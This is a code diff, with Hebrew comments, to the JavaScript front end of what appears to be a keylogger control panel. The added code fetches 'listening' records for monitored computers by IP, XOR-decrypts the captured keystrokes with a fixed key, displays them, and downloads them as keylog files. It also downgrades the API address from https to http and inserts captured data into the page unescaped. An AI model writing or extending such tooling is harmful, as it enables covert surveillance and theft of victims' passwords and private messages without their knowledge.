@@ -1,4 +1,4 @@
-const API_URL = 'https://localhost:5000/api';
+const API_URL = 'http://localhost:5000/api';
 
 let computers = [];
 document.addEventListener('DOMContentLoaded', () => {
@@ -205,4 +205,151 @@ function searchComputers() {
         `;
         tableBody.appendChild(tr);
     });
+}
+
+
+
+
+
+
+
+
+// עדכון לקובץ javaScript.js
+
+// פונקציה לפענוח תוכן מוצפן בצד הלקוח (אופציונלי - אפשר לעשות את זה בצד שרת)
+function decryptData(encryptedData, key = "F") {
+    let decrypted = '';
+    for(let i = 0; i < encryptedData.length; i++) {
+        const charCode = encryptedData.charCodeAt(i) ^ key.charCodeAt(0);
+        decrypted += String.fromCharCode(charCode % 256);
+    }
+    return decrypted;
+}
+
+// פונקציה מעודכנת להצגת נתוני האזנה
+async function showListeningData(ip) {
+    try {
+        const response = await fetch(`${API_URL}/listening/${ip}`);
+        if (!response.ok) {
+            throw new Error('Failed to fetch listening data');
+        }
+        
+        const data = await response.json();
+        const computer = computers.find(computer => computer.ip === ip);
+        const computerName = computer ? computer.name : 'Unknown';
+
+        const dashboardContent = document.getElementById('dashboard-content');
+        
+        // המרת הנתונים למבנה מסודר יותר
+        let contentHTML = '<div class="listening-records">';
+        
+        // בדיקה אם הנתונים הם מערך או אובייקט
+        if (Array.isArray(data)) {
+            // מערך של רשומות
+            for (const record of data) {
+                contentHTML += formatListeningRecord(record);
+            }
+        } else {
+            // אובייקט עם timestamps כמפתחות
+            for (const timestamp in data) {
+                contentHTML += `<div class="timestamp-header">${timestamp}</div>`;
+                contentHTML += formatListeningRecord(data[timestamp]);
+            }
+        }
+        
+        contentHTML += '</div>';
+
+        dashboardContent.innerHTML = `
+            <div class="listening-data">
+                <h2>נתוני האזנה של מחשב: ${computerName}</h2>
+                <div class="data-actions">
+                    <button onclick="updateComputersList()">חזרה לרשימה</button>
+                    <button onclick="showMonitoring('${ip}')">חזרה לפרטי מחשב</button>
+                    <button onclick="downloadDecodedData('${ip}')">הורד נתונים מפוענחים</button>
+                </div>
+                <div class="data-content">
+                    ${contentHTML}
+                </div>
+            </div>
+        `;
+    } catch (error) {
+        console.error("שגיאה בטעינת נתוני האזנה:", error);
+        alert("שגיאה בטעינת נתוני האזנה");
+    }
+}
+
+// פונקציית עזר לפירמוט רשומת האזנה
+function formatListeningRecord(record) {
+    if (Array.isArray(record)) {
+        // נסה לפענח את המידע המוצפן ולהציגו בצורה קריאה
+        try {
+            const decrypted = record.map(char => decryptData(char)).join('');
+            return `<div class="listening-entry">
+                <div class="raw-data" style="display:none">${JSON.stringify(record)}</div>
+                <div class="decrypted-data">${decrypted}</div>
+            </div>`;
+        } catch (e) {
+            return `<div class="listening-entry error">שגיאה בפענוח: ${e.message}</div>`;
+        }
+    } else if (typeof record === 'object') {
+        let html = '<div class="listening-entry">';
+        for (const key in record) {
+            html += `<div><strong>${key}:</strong> ${JSON.stringify(record[key])}</div>`;
+        }
+        html += '</div>';
+        return html;
+    } else {
+        return `<div class="listening-entry">${record}</div>`;
+    }
+}
+
+// פונקציה להורדת הנתונים המפוענחים
+async function downloadDecodedData(ip) {
+    try {
+        const response = await fetch(`${API_URL}/listening/${ip}`);
+        const data = await response.json();
+        
+        // המרת הנתונים לטקסט מפוענח
+        let decodedText = '';
+        
+        if (Array.isArray(data)) {
+            for (const record of data) {
+                decodedText += processRecordForDownload(record) + '\n\n';
+            }
+        } else {
+            for (const timestamp in data) {
+                decodedText += `=== ${timestamp} ===\n`;
+                decodedText += processRecordForDownload(data[timestamp]) + '\n\n';
+            }
+        }
+        
+        // יצירת קובץ להורדה
+        const blob = new Blob([decodedText], { type: 'text/plain' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `keylog_${ip}_decoded.txt`;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+    } catch (error) {
+        console.error("שגיאה בהורדת נתונים:", error);
+        alert("שגיאה בהורדת נתונים");
+    }
+}
+
+// פונקציית עזר להכנת רשומה להורדה
+function processRecordForDownload(record) {
+    if (Array.isArray(record)) {
+        return record.map(char => decryptData(char)).join('');
+    } else if (typeof record === 'object') {
+        let text = '';
+        for (const key in record) {
+            text += `${key}: ${JSON.stringify(record[key])}\n`;
+        }
+        return text;
+    } else {
+        return String(record);
+    }
 }
